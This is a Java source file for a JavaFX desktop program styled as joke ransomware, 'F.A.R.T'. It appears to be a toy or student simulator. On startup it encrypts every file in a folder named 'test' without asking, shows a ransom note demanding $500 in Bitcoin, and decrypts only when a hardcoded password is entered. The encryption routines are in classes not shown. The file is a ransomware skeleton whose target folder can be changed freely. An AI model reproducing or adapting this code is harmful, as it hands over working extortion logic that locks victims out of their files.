import javafx.application.Application;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.VBox;
import javafx.scene.text.Text;
import javafx.stage.Stage;
import java.net.URL;
import java.io.File;


public class Main extends Application {

    private static final String folderPath = "test";
    private static final String PASSWORD = "1234";

    @Override
    public void start(Stage stage) {
        stage.setTitle("F.A.R.T - Federal Agency of Ransom Technologies");


        // ===== TITLE =====

        Label subtitle = new Label("F.A.R.T: Federal Agency of Ransom Technologies");
        subtitle.getStyleClass().add("subtitle");



        // ===== BUTTONS =====
        Button decryptBtn = new Button("DECRYPT ALL FILES");

        decryptBtn.getStyleClass().add("button");

        //====== TEXT =======
        Text displayText = new Text(
        "***************** ALL YOUR FILES HAVE BEEN ENCRYPTED *****************\n\n" +
        "Your files have been encrypted due to a security problem with F.A.R.T.\n" +
        "To recover your files, you need to pay a ransom of $500 in Bitcoin.\n\n" +
        "To proceed with the payment and receive the decryption key, please contact us at:\n" +
        "email: fartOffical67@gmail.gov\n"
        );
        displayText.setWrappingWidth(1000);  
        displayText.setStyle(
        "-fx-font-size: 22px;" +
        "-fx-fill: lime;" +
        "-fx-font-family: Consolas;" +
        "-fx-font-weight: bold;" 
        );


        // ===== ENCRYPT =====
        
        File folder = new File(folderPath);
            if (folder.exists()) { 
                System.out.println("Folder found, encrypting...");
                for (File file : folder.listFiles()) {
                    if (file.isFile()) {
                        try {
                            EncryptFile.encrypt(file.toPath(), file.toPath());
                            System.out.println("Encrypted: " + file.getName());
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                }
            } else {
                System.out.println("WARNING: Folder not found. Skipping encryption.");
            }
        

        // ===== DECRYPT =====
        decryptBtn.setOnAction(e -> {
            TextInputDialog dialog = new TextInputDialog();
            dialog.setHeaderText("ENTER PASSWORD TO DECRYPT:");
            dialog.setContentText("Password:");

            dialog.showAndWait().ifPresent(password -> {
                if (!PASSWORD.equals(password)) {
                    return;
                }

                File folder2 = new File(folderPath);
                if (!folder2.exists()) {
                    return;
                }
                for (File file : folder2.listFiles()) {
                    if (file.isFile()) {
                        try {
                            DecryptFile.decrypt(file.toPath(), file.toPath());
                            System.out.println("Decrypted: " + file.getName());
                        } catch (Exception ex) {
                        }
                    }
                }
            });
        });

        Label footer = new Label("CLASSIFIED SYSTEM - AUTHORIZED PERSONNEL ONLY  ©COPYRIGHT F.A.R.T 2067");
        footer.getStyleClass().add("footer");

        VBox root = new VBox(20, subtitle, displayText, decryptBtn, footer);
        root.setAlignment(Pos.BOTTOM_CENTER);
        root.setPadding(new Insets(400,0,0,0));

        Scene scene = new Scene(root, 700, 600);
        
        URL cssUrl = getClass().getResource("/style.css");
        if (cssUrl == null) {
            System.out.println("Error: style.css not found in resources!");
                cssUrl = getClass().getResource("style.css");
        }
            
        if (cssUrl != null) {
            scene.getStylesheets().add(cssUrl.toExternalForm());
        } else {
            System.out.println("CRITICAL: Could not load CSS from resources.");
        }

        stage.setScene(scene);
        stage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}
